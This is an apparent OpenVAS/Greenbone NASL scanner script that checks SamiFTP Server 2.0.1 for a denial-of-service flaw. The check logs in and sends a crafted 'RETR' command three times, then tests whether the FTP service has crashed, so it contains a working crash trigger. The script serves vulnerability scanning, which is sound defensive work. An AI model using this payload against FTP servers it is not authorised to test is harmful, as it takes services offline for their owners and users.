if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803717" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_bugtraq_id( 60513 );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:S/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-06-13 15:16:51 +0530 (Thu, 13 Jun 2013)" );
	script_name( "SamiFTP Server 'RETR' Command Denial of Service Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/26133" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/windows/sami-ftp-server-201-retr-denial-of-service" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/samiftp/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow the remote attackers to cause
  a denial of service." );
	script_tag( name: "affected", value: "SamiFTP Server version 2.0.1." );
	script_tag( name: "insight", value: "The flaw is due to an error while parsing RETR command, which can
  be exploited to crash the FTP service by sending crafted data via 'RETR' command." );
	script_tag( name: "solution", value: "Upgrade to version 2.0.2 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "The host is running SamiFTP Server and is prone to denial of
  service vulnerability." );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
samiPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: samiPort );
if(!banner || !ContainsString( banner, "220 Features p a" )){
	exit( 0 );
}
soc = open_sock_tcp( samiPort );
if(!soc){
	exit( 0 );
}
banner = ftp_recv_line( socket: soc );
ftp_close( socket: soc );
if(!banner || !ContainsString( banner, "220 Features p a" )){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
flag = 0;
for(i = 0;i < 3;i++){
	soc1 = open_sock_tcp( samiPort );
	if(!soc1 && flag == 0){
		exit( 0 );
	}
	ftplogin = ftp_log_in( socket: soc1, user: user, pass: pass );
	if(!ftplogin && flag == 0){
		exit( 0 );
	}
	flag = 1;
	if(!ftplogin || !soc1){
		security_message( port: samiPort );
		exit( 0 );
	}
	send( socket: soc1, data: NASLString( "RETR \\x41", "\r\n" ) );
	ftp_close( socket: soc1 );
}
sleep( 3 );
soc2 = open_sock_tcp( samiPort );
if(!soc2){
	security_message( port: samiPort );
	exit( 0 );
}
resp = ftp_recv_line( socket: soc2 );
ftp_close( socket: soc2 );
if(!resp || !ContainsString( resp, "220 Features p a" )){
	security_message( port: samiPort );
	exit( 0 );
}

